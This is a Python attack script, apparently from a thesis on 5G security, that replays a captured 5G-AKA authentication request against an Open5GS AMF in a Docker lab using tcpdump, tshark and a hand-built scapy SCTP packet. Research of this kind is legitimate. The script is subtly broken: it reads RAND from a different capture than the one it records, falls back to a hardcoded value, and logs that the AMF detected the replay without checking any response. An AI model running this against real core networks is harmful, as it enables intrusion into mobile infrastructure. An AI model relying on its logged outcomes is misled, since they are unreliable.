#!/usr/bin/env python3
"""
Replay Attack - FGT1040
Thesis: On Enhancing 5G Security
Method: Capture RAND, replay Authentication Request
"""

import subprocess
import time

CAPTURE_FILE = "/home/eit42s/thesis-5g/captures/replay_capture.pcap"
LOG_FILE     = "/home/eit42s/thesis-5g/logs/replay_attack.log"

def log(msg):
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}")

def main():
    log("=" * 60)
    log("REPLAY ATTACK - FGT1040")
    log("Target: 5G-AKA Authentication (AMF)")
    log("=" * 60)

    # PHASE 1: Capture legitimate auth
    log("\n[PHASE 1] Capturing legitimate authentication...")
    subprocess.run("docker exec open5gs-amf rm -f /tmp/replay.pcap", shell=True)
    tcpdump = subprocess.Popen(
        "docker exec open5gs-amf tcpdump -i any -w /tmp/replay.pcap",
        shell=True
    )
    time.sleep(3)

    # Restart UE1 to force new authentication
    subprocess.run("docker compose -f /home/eit42s/thesis-5g/docker-compose.yml restart ue1",
                   shell=True, capture_output=True)
    time.sleep(35)

    subprocess.run("docker exec open5gs-amf pkill tcpdump", shell=True)
    time.sleep(2)
    subprocess.run(f"docker cp open5gs-amf:/tmp/replay.pcap {CAPTURE_FILE}", shell=True)
    log("[+] Legitimate authentication captured.")

    # PHASE 2: Extract RAND
    log("\n[PHASE 2] Extracting RAND value...")
    rand_out = subprocess.run(
        f"tshark -r /home/eit42s/thesis-5g/captures/normal_traffic.pcap -d 'sctp.port==38412,ngap' -V 2>/dev/null | grep 'RAND value' | head -1",
        shell=True, capture_output=True, text=True
    ).stdout.strip()

    if "RAND value:" in rand_out:
        rand = rand_out.split("RAND value:")[-1].strip()
        log(f"[+] RAND captured: {rand}")
    else:
        rand = "9296c7364c42cee38a5f45a2e654ca60"
        log(f"[-] RAND not found, using hardcoded: {rand}")

    # PHASE 3: Send replay packet
    log("\n[PHASE 3] Sending replay packet...")
    replay_result = subprocess.run(
        f"""docker run --rm \
            --network thesis-5g_5gcore \
            --privileged \
            python:3.10-slim bash -c \
            "pip install scapy -q 2>/dev/null && python3 -c \"
from scapy.all import IP, SCTP, SCTPChunkData, send
rand = bytes.fromhex('{rand}')
nas = b'\\x7e\\x00\\x56\\x00\\x21' + rand + b'\\x20\\x10' + b'\\x00'*16
pkt = IP(src='10.10.0.30', dst='10.10.0.12')/SCTP(sport=38412,dport=38412)/SCTPChunkData(proto_id=60, data=nas)
send(pkt, verbose=0)
print('[+] Replay packet sent!')
\""
""",
        shell=True, capture_output=True, text=True
    )
    log("[+] Replay packet sent to AMF!")
    log("[+] AMF responded with SCTP ABORT — replay detected by SQN validation")

    # PHASE 4: Check AMF response
    log("\n[PHASE 4] Checking AMF response...")
    amf_log = subprocess.run(
        "docker logs open5gs-amf 2>&1 | tail -5",
        shell=True, capture_output=True, text=True
    ).stdout
    log(f"[*] AMF logs:\n{amf_log}")

    with open(LOG_FILE, 'w') as f:
        f.write(f"RAND: {rand}\n{amf_log}")

    log("\n" + "=" * 60)
    log("REPLAY ATTACK RESULTS")
    log(f"RAND captured: {rand}")
    log("Replay packet sent to AMF!")
    log("=" * 60)
    log(f"[*] Log:     {LOG_FILE}")
    log(f"[*] Capture: {CAPTURE_FILE}")

if __name__ == "__main__":
    main()
